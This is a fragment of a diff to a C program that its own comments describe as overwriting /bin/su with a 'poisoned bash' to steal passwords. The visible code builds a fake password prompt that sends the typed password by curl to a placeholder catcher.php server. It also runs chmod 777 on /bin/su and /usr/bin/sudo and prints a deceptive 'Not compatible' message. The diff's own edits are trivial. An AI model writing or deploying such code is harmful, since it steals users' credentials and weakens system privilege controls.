@@ -26,8 +26,8 @@ int main () {
 
 
    /** OVERWRITE /BIN/SU WITH POISONED BASH THAT STEPS THE PASSWORDS **/ 
-  
-   FILE *file1; /** MALICIUS FILE **/
+  /** MALICIUS FILE **/
+   FILE *file1; 
 
    char cmmd1[300] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" > /dev/null 2>&1 \n";
 
@@ -74,6 +74,7 @@ system("chmod 777 /bin/su > /dev/null 2>&1");
 
 /** GIVE 777 **/system("chmod 777 /usr/bin/sudo > /dev/null 2>&1");
    printf("Error: Not compatible")
+   printf("Exiting...")
    return(0);
 } 
 
